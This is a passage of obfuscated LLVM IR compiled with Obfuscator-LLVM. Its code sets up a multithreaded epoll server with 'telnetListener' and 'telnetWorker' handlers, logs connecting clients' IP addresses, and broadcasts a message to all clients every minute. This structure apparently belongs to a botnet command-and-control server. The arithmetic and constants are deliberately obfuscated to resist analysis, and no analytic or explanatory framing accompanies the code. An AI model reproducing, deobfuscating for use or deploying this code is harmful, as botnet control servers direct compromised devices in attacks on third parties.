  %55 = or i32 -1274409074, %53
  %56 = xor i32 %54, -1
  %57 = and i32 %56, %55
  %58 = and i32 %50, 65280
  %59 = lshr i32 %57, 8
  %60 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 2
  %61 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %60, i32 0, i32 0
  %62 = load i32, i32* %61, align 4
  %63 = xor i32 %62, -1
  %64 = xor i32 16711680, -1
  %65 = xor i32 -2103416770, -1
  %66 = or i32 %63, %64
  %67 = or i32 -2103416770, %65
  %68 = xor i32 %66, -1
  %69 = and i32 %68, %67
  %70 = and i32 %62, 16711680
  %71 = lshr i32 %69, 16
  %72 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 2
  %73 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %72, i32 0, i32 0
  %74 = load i32, i32* %73, align 4
  %75 = xor i32 %74, -1
  %76 = xor i32 -16777216, -1
  %77 = xor i32 -56812326, -1
  %78 = or i32 %75, %76
  %79 = or i32 -56812326, %77
  %80 = xor i32 %78, -1
  %81 = and i32 %80, %79
  %82 = and i32 %74, -16777216
  %83 = lshr i32 %81, 24
  %84 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %40, i8* getelementptr inbounds ([90 x i8], [90 x i8]* @.str.211, i32 0, i32 0), i32 %46, i32 %59, i32 %71, i32 %83)
  %85 = load %struct._IO_FILE*, %struct._IO_FILE** %9, align 8
  %86 = call i32 @fclose(%struct._IO_FILE* %85)
  %87 = load i32, i32* %4, align 4
  %88 = bitcast %struct.sockaddr_in* %8 to %struct.sockaddr*
  %89 = call i32 @accept(i32 %87, %struct.sockaddr* %88, i32* %6)
  store i32 %89, i32* %5, align 4
  %90 = load i32, i32* %5, align 4
  %91 = icmp slt i32 %90, 0
  br i1 %91, label %92, label %93

; <label>:92:                                     ; preds = %32
  call void @perror(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.212, i32 0, i32 0))
  br label %93

; <label>:93:                                     ; preds = %92, %32
  %94 = load i32, i32* %5, align 4
  %95 = sext i32 %94 to i64
  %96 = inttoptr i64 %95 to i8*
  %97 = call i32 @pthread_create(i64* %10, %union.pthread_attr_t* null, i8* (i8*)* @telnetWorker, i8* %96) #7
  br label %32
                                                  ; No predecessors!
  %99 = load i8*, i8** %2, align 8
  ret i8* %99
}

; Function Attrs: nounwind
declare i32 @socket(i32, i32, i32) #3

; Function Attrs: nounwind readnone
declare zeroext i16 @htons(i16 zeroext) #5

; Function Attrs: nounwind
declare i32 @bind(i32, %struct.sockaddr*, i32) #3

; Function Attrs: nounwind
declare i32 @listen(i32, i32) #3

; Function Attrs: noinline nounwind uwtable
define i32 @main(i32, i8**, i8**) #0 {
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i8**, align 8
  %7 = alloca i8**, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca %struct.epoll_event, align 1
  %12 = alloca i8*, align 8
  store i32 0, i32* %4, align 4
  store i32 %0, i32* %5, align 4
  store i8** %1, i8*** %6, align 8
  store i8** %2, i8*** %7, align 8
  %13 = call void (i32)* @signal(i32 13, void (i32)* inttoptr (i64 1 to void (i32)*)) #7
  %14 = load i32, i32* %5, align 4
  %15 = icmp ne i32 %14, 4
  br i1 %15, label %16, label %22

; <label>:16:                                     ; preds = %3
  %17 = load %struct._IO_FILE*, %struct._IO_FILE** @stderr, align 8
  %18 = load i8**, i8*** %6, align 8
  %19 = getelementptr inbounds i8*, i8** %18, i64 0
  %20 = load i8*, i8** %19, align 8
  %21 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %17, i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.213, i32 0, i32 0), i8* %20)
  call void @exit(i32 1) #10
  unreachable

; <label>:22:                                     ; preds = %3
  %23 = load i8**, i8*** %6, align 8
  %24 = getelementptr inbounds i8*, i8** %23, i64 3
  %25 = load i8*, i8** %24, align 8
  %26 = call i32 @atoi(i8* %25) #8
  store i32 %26, i32* %10, align 4
  %27 = load i8**, i8*** %6, align 8
  %28 = getelementptr inbounds i8*, i8** %27, i64 2
  %29 = load i8*, i8** %28, align 8
  %30 = call i32 @atoi(i8* %29) #8
  store i32 %30, i32* %9, align 4
  %31 = load i32, i32* %9, align 4
  %32 = icmp sgt i32 %31, 1000
  br i1 %32, label %33, label %35

; <label>:33:                                     ; preds = %22
  %34 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([87 x i8], [87 x i8]* @.str.214, i32 0, i32 0))
  ret i32 0

; <label>:35:                                     ; preds = %22
  %36 = load i32, i32* %9, align 4
  %37 = icmp slt i32 %36, 1000
  br i1 %37, label %38, label %40

; <label>:38:                                     ; preds = %35
  %39 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.17, i32 0, i32 0))
  br label %40

; <label>:40:                                     ; preds = %38, %35
  br label %41

; <label>:41:                                     ; preds = %40
  %42 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([111 x i8], [111 x i8]* @.str.215, i32 0, i32 0))
  %43 = load i8**, i8*** %6, align 8
  %44 = getelementptr inbounds i8*, i8** %43, i64 1
  %45 = load i8*, i8** %44, align 8
  %46 = call i32 @create_and_bind(i8* %45)
  store volatile i32 %46, i32* @listenFD, align 4
  %47 = load volatile i32, i32* @listenFD, align 4
  %48 = icmp eq i32 %47, -1
  br i1 %48, label %49, label %50

; <label>:49:                                     ; preds = %41
  call void @abort() #10
  unreachable

; <label>:50:                                     ; preds = %41
  %51 = load volatile i32, i32* @listenFD, align 4
  %52 = call i32 @make_socket_non_blocking(i32 %51)
  store i32 %52, i32* %8, align 4
  %53 = load i32, i32* %8, align 4
  %54 = icmp eq i32 %53, -1
  br i1 %54, label %55, label %56

; <label>:55:                                     ; preds = %50
  call void @abort() #10
  unreachable

; <label>:56:                                     ; preds = %50
  %57 = load volatile i32, i32* @listenFD, align 4
  %58 = call i32 @listen(i32 %57, i32 128) #7
  store i32 %58, i32* %8, align 4
  %59 = load i32, i32* %8, align 4
  %60 = icmp eq i32 %59, -1
  br i1 %60, label %61, label %62

; <label>:61:                                     ; preds = %56
  call void @perror(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.216, i32 0, i32 0))
  call void @abort() #10
  unreachable

; <label>:62:                                     ; preds = %56
  %63 = call i32 @epoll_create1(i32 0) #7
  store volatile i32 %63, i32* @epollFD, align 4
  %64 = load volatile i32, i32* @epollFD, align 4
  %65 = icmp eq i32 %64, -1
  br i1 %65, label %66, label %67

; <label>:66:                                     ; preds = %62
  call void @perror(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.217, i32 0, i32 0))
  call void @abort() #10
  unreachable

; <label>:67:                                     ; preds = %62
  %68 = load volatile i32, i32* @listenFD, align 4
  %69 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %11, i32 0, i32 1
  %70 = bitcast %union.epoll_data* %69 to i32*
  store i32 %68, i32* %70, align 1
  %71 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %11, i32 0, i32 0
  store i32 -2147483647, i32* %71, align 1
  %72 = load volatile i32, i32* @epollFD, align 4
  %73 = load volatile i32, i32* @listenFD, align 4
  %74 = call i32 @epoll_ctl(i32 %72, i32 1, i32 %73, %struct.epoll_event* %11) #7
  store i32 %74, i32* %8, align 4
  %75 = load i32, i32* %8, align 4
  %76 = icmp eq i32 %75, -1
  br i1 %76, label %77, label %78

; <label>:77:                                     ; preds = %67
  call void @perror(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.2, i32 0, i32 0))
  call void @abort() #10
  unreachable

; <label>:78:                                     ; preds = %67
  %79 = load i32, i32* %9, align 4
  %80 = sub i32 0, %79
  %81 = sub i32 0, 2
  %82 = add i32 %80, %81
  %83 = sub i32 0, %82
  %84 = add nsw i32 %79, 2
  %85 = zext i32 %83 to i64
  %86 = call i8* @llvm.stacksave()
  store i8* %86, i8** %12, align 8
  %87 = alloca i64, i64 %85, align 16
  br label %88

; <label>:88:                                     ; preds = %95, %78
  %89 = load i32, i32* %9, align 4
  %90 = add i32 %89, -1428686066
  %91 = add i32 %90, -1
  %92 = sub i32 %91, -1428686066
  %93 = add nsw i32 %89, -1
  store i32 %92, i32* %9, align 4
  %94 = icmp ne i32 %89, 0
  br i1 %94, label %95, label %105

; <label>:95:                                     ; preds = %88
  %96 = load i32, i32* %9, align 4
  %97 = sub i32 0, %96
  %98 = sub i32 0, 1
  %99 = add i32 %97, %98
  %100 = sub i32 0, %99
  %101 = add nsw i32 %96, 1
  %102 = sext i32 %100 to i64
  %103 = getelementptr inbounds i64, i64* %87, i64 %102
  %104 = call i32 @pthread_create(i64* %103, %union.pthread_attr_t* null, i8* (i8*)* @epollEventLoop, i8* null) #7
  br label %88

; <label>:105:                                    ; preds = %88
  %106 = getelementptr inbounds i64, i64* %87, i64 0
  %107 = load i32, i32* %10, align 4
  %108 = sext i32 %107 to i64
  %109 = inttoptr i64 %108 to i8*
  %110 = call i32 @pthread_create(i64* %106, %union.pthread_attr_t* null, i8* (i8*)* bitcast (i8* (i32)* @telnetListener to i8* (i8*)*), i8* %109) #7
  br label %111

; <label>:111:                                    ; preds = %112, %105
  br label %112

; <label>:112:                                    ; preds = %111
  call void @broadcast(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i32 0, i32 0), i32 -1, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.218, i32 0, i32 0))
  %113 = call i32 @sleep(i32 60)
  br label %111
}

; Function Attrs: nounwind
declare void (i32)* @signal(i32, void (i32)*) #3

; Function Attrs: noreturn nounwind
declare void @exit(i32) #6

; Function Attrs: nounwind readonly
declare i32 @atoi(i8*) #2

; Function Attrs: noinline nounwind uwtable
define internal i32 @create_and_bind(i8*) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i8*, align 8
  %4 = alloca %struct.addrinfo, align 8
  %5 = alloca %struct.addrinfo*, align 8
  %6 = alloca %struct.addrinfo*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  %10 = bitcast %struct.addrinfo* %4 to i8*
  call void @llvm.memset.p0i8.i64(i8* %10, i8 0, i64 48, i32 8, i1 false)
  %11 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %4, i32 0, i32 1
  store i32 0, i32* %11, align 4
  %12 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %4, i32 0, i32 2
  store i32 1, i32* %12, align 8
  %13 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %4, i32 0, i32 0
  store i32 1, i32* %13, align 8
  %14 = load i8*, i8** %3, align 8
  %15 = call i32 @getaddrinfo(i8* null, i8* %14, %struct.addrinfo* %4, %struct.addrinfo** %5)
  store i32 %15, i32* %7, align 4
  %16 = load i32, i32* %7, align 4
  %17 = icmp ne i32 %16, 0
  br i1 %17, label %18, label %23

; <label>:18:                                     ; preds = %1
  %19 = load %struct._IO_FILE*, %struct._IO_FILE** @stderr, align 8
  %20 = load i32, i32* %7, align 4
  %21 = call i8* @gai_strerror(i32 %20) #7
  %22 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %19, i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.220, i32 0, i32 0), i8* %21)
  store i32 -1, i32* %2, align 4
  br label %76

; <label>:23:                                     ; preds = %1
  %24 = load %struct.addrinfo*, %struct.addrinfo** %5, align 8
  store %struct.addrinfo* %24, %struct.addrinfo** %6, align 8
  br label %25

; <label>:25:                                     ; preds = %63, %23
  %26 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %27 = icmp ne %struct.addrinfo* %26, null
  br i1 %27, label %28, label %67

; <label>:28:                                     ; preds = %25
  %29 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %30 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %29, i32 0, i32 1
  %31 = load i32, i32* %30, align 4
  %32 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %33 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %32, i32 0, i32 2
  %34 = load i32, i32* %33, align 8
  %35 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %36 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %35, i32 0, i32 3
  %37 = load i32, i32* %36, align 4
  %38 = call i32 @socket(i32 %31, i32 %34, i32 %37) #7
  store i32 %38, i32* %8, align 4
  %39 = load i32, i32* %8, align 4
  %40 = icmp eq i32 %39, -1
  br i1 %40, label %41, label %42

; <label>:41:                                     ; preds = %28
  br label %63

; <label>:42:                                     ; preds = %28
  store i32 1, i32* %9, align 4
  %43 = load i32, i32* %8, align 4
  %44 = bitcast i32* %9 to i8*
  %45 = call i32 @setsockopt(i32 %43, i32 1, i32 2, i8* %44, i32 4) #7
  %46 = icmp eq i32 %45, -1
  br i1 %46, label %47, label %48

; <label>:47:                                     ; preds = %42
  call void @perror(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.221, i32 0, i32 0))
  br label %48

; <label>:48:                                     ; preds = %47, %42
  %49 = load i32, i32* %8, align 4
  %50 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %51 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %50, i32 0, i32 5
  %52 = load %struct.sockaddr*, %struct.sockaddr** %51, align 8
  %53 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %54 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %53, i32 0, i32 4
  %55 = load i32, i32* %54, align 8
  %56 = call i32 @bind(i32 %49, %struct.sockaddr* %52, i32 %55) #7
  store i32 %56, i32* %7, align 4
  %57 = load i32, i32* %7, align 4
  %58 = icmp eq i32 %57, 0
  br i1 %58, label %59, label %60

; <label>:59:                                     ; preds = %48
  br label %67

; <label>:60:                                     ; preds = %48
  %61 = load i32, i32* %8, align 4
  %62 = call i32 @close(i32 %61)
  br label %63

; <label>:63:                                     ; preds = %60, %41
  %64 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %65 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %64, i32 0, i32 7
  %66 = load %struct.addrinfo*, %struct.addrinfo** %65, align 8
  store %struct.addrinfo* %66, %struct.addrinfo** %6, align 8
  br label %25

; <label>:67:                                     ; preds = %59, %25
  %68 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %69 = icmp eq %struct.addrinfo* %68, null
  br i1 %69, label %70, label %73

; <label>:70:                                     ; preds = %67
  %71 = load %struct._IO_FILE*, %struct._IO_FILE** @stderr, align 8
  %72 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %71, i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.222, i32 0, i32 0))
  store i32 -1, i32* %2, align 4
  br label %76

; <label>:73:                                     ; preds = %67
  %74 = load %struct.addrinfo*, %struct.addrinfo** %5, align 8
  call void @freeaddrinfo(%struct.addrinfo* %74) #7
  %75 = load i32, i32* %8, align 4
  store i32 %75, i32* %2, align 4
  br label %76

; <label>:76:                                     ; preds = %73, %70, %18
  %77 = load i32, i32* %2, align 4
  ret i32 %77
}

; Function Attrs: noreturn nounwind
declare void @abort() #6

; Function Attrs: nounwind
declare i32 @epoll_create1(i32) #3

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #7

declare i32 @getaddrinfo(i8*, i8*, %struct.addrinfo*, %struct.addrinfo**) #1

; Function Attrs: nounwind
declare i8* @gai_strerror(i32) #3

; Function Attrs: nounwind
declare i32 @setsockopt(i32, i32, i32, i8*, i32) #3

; Function Attrs: nounwind
declare void @freeaddrinfo(%struct.addrinfo*) #3

attributes #0 = { noinline nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { nounwind readonly "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { argmemonly nounwind }
attributes #5 = { nounwind readnone "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #6 = { noreturn nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #7 = { nounwind }
attributes #8 = { nounwind readonly }
attributes #9 = { nounwind readnone }
attributes #10 = { noreturn nounwind }

!llvm.ident = !{!0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0}

!0 = !{!"Obfuscator-LLVM clang version 4.0.1  (based on Obfuscator-LLVM 4.0.1)"}
